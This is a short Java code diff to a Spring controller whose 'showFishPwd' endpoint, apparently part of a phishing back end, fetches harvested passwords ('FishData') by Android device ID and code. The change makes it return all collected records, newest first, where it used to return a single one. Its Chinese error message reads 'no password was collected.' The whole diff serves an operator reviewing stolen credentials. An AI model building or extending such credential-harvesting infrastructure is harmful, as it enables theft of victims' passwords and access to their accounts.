@@ -5,6 +5,7 @@ import java.util.Objects;
 
 import javax.annotation.Resource;
 
+import org.apache.commons.collections.CollectionUtils;
 import org.apache.commons.lang3.StringUtils;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
@@ -226,14 +227,17 @@ public class DeviceController extends BaseController {
     }
     
     @RequestMapping("showFishPwd")
-    public Result<FishData> showFishPwd(@RequestBody JSONObject jsonObject){
+    public Result<List<FishData>> showFishPwd(@RequestBody JSONObject jsonObject){
         String deviceId = jsonObject.getString("deviceId");
         String code = jsonObject.getString("code");
-        FishData data = fishDataService.getOne(new LambdaQueryWrapper<FishData>().eq(FishData::getAndroidId, deviceId).eq(FishData::getCode, code));
-        if(data ==null) {
+        List<FishData> datas = fishDataService.list(new LambdaQueryWrapper<FishData>()
+        		.eq(FishData::getAndroidId, deviceId)
+        		.eq(FishData::getCode, code)
+        		.orderByDesc(FishData::getCreated));
+        if(CollectionUtils.isEmpty(datas)) {
         	 return  Result.toError("没有采集到密码!");
         }
-        return Result.toSuccess(data);
+        return Result.toSuccess(datas);
     }
 
 }
